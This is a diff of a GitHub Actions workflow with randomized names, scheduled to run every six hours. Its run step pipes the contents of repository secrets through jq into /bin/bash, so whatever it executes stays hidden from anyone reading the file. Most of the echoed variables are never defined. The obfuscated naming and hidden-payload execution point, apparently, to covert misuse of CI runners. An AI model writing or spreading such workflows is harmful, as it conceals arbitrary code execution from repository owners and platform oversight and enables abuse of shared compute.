@@ -1,25 +1,20 @@
 name: xucijiu3176
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 0/6 * * *'
+    - cron: '16 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xucijiu3176
         env:
-          uv0202: ${{ secrets.uv0202 }}
+          rgwy0: ${{ secrets.rgwy0 }}
         run: |
-          echo $uv0202 | jq -r .flgn04677 | /bin/bash
-          echo $hit62074 | jq -r .u7327 | /bin/bash
-          echo $sga89 | jq -r .yk086 | /bin/bash
-          echo $a306 | jq -r .usrk28 | /bin/bash
-          echo $wp449 | jq -r .bw8398 | /bin/bash
-          echo $ifrmg2 | jq -r .ovoe57415 | /bin/bash
-          echo $d3198 | jq -r .ykpb3720 | /bin/bash
-          echo $a08 | jq -r .dlqmt18 | /bin/bash
-          echo $pre59 | jq -r .wwt74738 | /bin/bash
+          echo $rgwy0 | jq -r .cj42 | /bin/bash
+          echo $sogg05797 | jq -r .dj5 | /bin/bash
+          echo $hc715 | jq -r .mofnq904 | /bin/bash
+          echo $wygt274 | jq -r .whfm67 | /bin/bash
 
